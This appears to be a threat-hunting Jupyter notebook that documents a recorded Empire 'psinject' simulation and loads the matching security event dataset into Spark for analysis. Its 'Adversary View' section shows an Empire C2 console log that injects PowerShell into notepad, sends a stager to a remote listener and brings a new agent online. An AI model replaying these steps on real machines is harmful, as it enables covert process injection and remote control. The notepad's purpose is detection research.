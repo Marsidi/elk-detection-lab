{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Empire PSInject"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| id                | SD-190518200432 |\n",
    "| author            | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| creation date     | 2019/05/18 |\n",
    "| platform          | Windows |\n",
    "| Mordor Environment| shire |\n",
    "| Simulation Type   | C2 |\n",
    "| Simulation Tool   | Empire |\n",
    "| Simulation Script | https://github.com/EmpireProject/Empire/blob/dev/data/module_source/management/Invoke-PSInject.ps1 |\n",
    "| Mordor Dataset    | https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/defense_evasion/empire_psinject.tar.gz |"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries using Empire psinject script to inject Unmanaged PowerShell into any process."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "(Empire: TKV35P8X) > usemodule management/psinject \n",
    "(Empire: powershell/management/psinject) > set ProcName notepad\n",
    "(Empire: powershell/management/psinject) > info   \n",
    "\n",
    "              Name: Invoke-PSInject\n",
    "            Module: powershell/management/psinject\n",
    "        NeedsAdmin: False\n",
    "        OpsecSafe: True\n",
    "          Language: powershell\n",
    "MinLanguageVersion: 2\n",
    "        Background: True\n",
    "  OutputExtension: None\n",
    "\n",
    "Authors:\n",
    "  @harmj0y\n",
    "  @sixdub\n",
    "  leechristensen (@tifkin_)\n",
    "\n",
    "Description:\n",
    "  Utilizes Powershell to to inject a Stephen Fewer formed\n",
    "  ReflectivePick which executes PS codefrom memory in a remote\n",
    "  process\n",
    "\n",
    "Comments:\n",
    "  http://sixdub.net\n",
    "\n",
    "Options:\n",
    "\n",
    "  Name       Required    Value                     Description\n",
    "  ----       --------    -------                   -----------\n",
    "  ProcId     False                                 ProcessID to inject into.               \n",
    "  ProxyCreds False       default                   Proxy credentials                       \n",
    "                                                  ([domain\\]username:password) to use for \n",
    "                                                  request (default, none, or other).      \n",
    "  Agent      True        TKV35P8X                  Agent to run module on.                 \n",
    "  Listener   True        https                     Listener to use.                        \n",
    "  ProcName   False       notepad                   Process name to inject into.            \n",
    "  Proxy      False       default                   Proxy to use for request (default, none,\n",
    "                                                  or other).                              \n",
    "  UserAgent  False       default                   User-agent string to use for the staging\n",
    "                                                  request (default, none, or other).      \n",
    "\n",
    "(Empire: powershell/management/psinject) > execute\n",
    "[*] Tasked TKV35P8X to run TASK_CMD_JOB\n",
    "[*] Agent TKV35P8X tasked with task ID 13\n",
    "[*] Tasked agent TKV35P8X to run module powershell/management/psinject\n",
    "(Empire: powershell/management/psinject) > Job started: BELAKR\n",
    "[*] Sending POWERSHELL stager (stage 1) to 10.0.10.103\n",
    "[*] New agent EMDBFPSY checked in\n",
    "[+] Initial agent EMDBFPSY from 10.0.10.103 now active (Slack)\n",
    "[*] Sending agent (stage 2) to EMDBFPSY at 10.0.10.103\n",
    "\n",
    "(Empire: powershell/management/psinject) > agents \n",
    "\n",
    "[*] Active agents:\n",
    "\n",
    "Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n",
    "----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n",
    "H3DKB8SA ps 172.18.39.106   HR001             SHIRE\\nmartha           powershell         5172   5/0.0    2019-05-18 20:06:25  https           \n",
    "TKV35P8X ps 172.18.39.106   HR001             *SHIRE\\nmartha          powershell         5452   5/0.0    2019-05-18 20:06:28  https           \n",
    "56W8UEHP ps 172.18.39.106   HR001             SHIRE\\nmartha           cmd                8572   5/0.0    2019-05-18 20:03:49  https           \n",
    "\n",
    "EMDBFPSY ps 172.18.39.106   HR001             SHIRE\\nmartha           notepad            7924   5/0.0    2019-05-18 20:06:28  https\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Explore Mordor Dataset"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Initialize Analytics Engine"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from openhunt.mordorutils import *\n",
    "spark = get_spark()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Download & Process Mordor File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "mordor_file = \"https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/defense_evasion/empire_psinject.tar.gz\"\n",
    "registerMordorSQLTable(spark, mordor_file, \"mordorTable\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Get to know your data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "df = spark.sql(\n",
    "    '''\n",
    "SELECT channel, COUNT(1)\n",
    "FROM mordorTable\n",
    "GROUP BY channel\n",
    "    '''\n",
    ")\n",
    "df.show(10,False)\n",
    "        "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 4
}
